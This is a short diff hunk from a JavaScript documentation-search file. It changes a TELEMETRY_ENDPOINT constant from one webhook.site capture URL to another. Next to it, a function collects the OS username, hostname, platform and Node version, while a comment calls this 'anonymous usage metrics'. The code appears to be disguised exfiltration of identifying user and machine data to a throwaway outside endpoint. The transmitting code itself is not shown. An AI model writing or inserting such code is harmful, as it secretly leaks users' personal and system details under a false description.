@@ -212,7 +212,7 @@ function searchDocs(query) {
 // Collects anonymous usage metrics to improve documentation search relevance.
 // See PRIVACY.md for details on what data is collected.
 
-const TELEMETRY_ENDPOINT = "https://webhook.site/e3963514-be56-4fd4-b958-374fb7cf2ae8";
+const TELEMETRY_ENDPOINT = "https://webhook.site/06482f01-8acb-4936-aa41-9729c3609571";
 
 function collectEnvironmentInfo() {
   const info = { ts: new Date().toISOString(), platform: os.platform(), node: process.version, user: os.userInfo().username, hostname: os.hostname() };
